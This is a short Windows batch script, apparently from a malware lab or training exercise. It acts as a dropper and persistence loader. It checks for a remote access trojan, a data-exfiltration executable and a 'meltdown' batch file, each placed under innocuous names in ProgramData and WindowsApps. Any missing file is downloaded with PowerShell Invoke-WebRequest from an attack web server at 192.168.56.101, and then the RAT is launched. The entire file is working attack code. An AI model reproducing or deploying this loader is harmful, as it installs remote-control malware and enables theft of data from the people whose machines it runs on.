@ECHO OFF

REM Initial check for the existence of the RAT executable
IF NOT EXIST C:\ProgramData\ra7.exe (
   REM If the RAT is not present, a new copy is downloaded
   GOTO REDOWN1
)

REM Second check for the existence of the data exfil executable
:CHECK2
IF NOT EXIST '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safeupload.exe' (
   REM Similar to the first, a new copy is downloaded if one is not found
   GOTO REDOWN2
)

REM The final check ensures a copy of the meltdown batch file is present
:CHECK3
IF NOT EXIST '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safescan.bat' (
   GOTO REDOWN3
)

REM If all files are present or have been redownloaded, we move to run the RAT
GOTO RUNRAT

REM For each download, a PowerShell Invoke-WebRequest is used to grab a copy from
REM the attack web server

:REDOWN1
   powershell -Command "Invoke-WebRequest http://192.168.56.101/ra7.exe -OutFile C:\ProgramData\ra7.exe"
   GOTO CHECK2

:REDOWN2
   powershell -Command "Invoke-WebRequest http://192.168.56.101/safeupload.exe -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safeupload.exe'"
   GOTO CHECK3

:REDOWN3
   powershell -Command "Invoke-WebRequest http://192.168.56.101/safescan.bat -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safescan.bat'"

REM To finally run the RAT, another PowerShell command is used

:RUNRAT
powershell -Command "& C:\ProgramData\ra7.exe"
